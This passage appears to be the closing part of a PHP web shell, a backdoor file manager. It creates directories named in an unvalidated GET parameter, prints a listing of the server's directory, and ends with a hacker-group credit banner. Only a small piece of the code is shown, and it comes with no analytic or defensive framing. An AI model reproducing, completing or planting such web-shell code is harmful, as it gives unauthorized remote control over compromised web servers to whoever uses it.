$path = $pwd.$_GET['mkdir']; @mkdir($path);
}
$buff = showdir($pwd,$prompt);
echo $buff;
}
?>
<center><br><br><br><br>
Coded By Aerul Da White-Hkc</br>
Thanks to All Indonesian Coder | All Indonesian Hacker | <img src='http://i24.photobucket.com/albums/c42/revoconsole/msH17e0_zps010a75c6.gif' /><br>
</center>
</div>
</body>
</html>
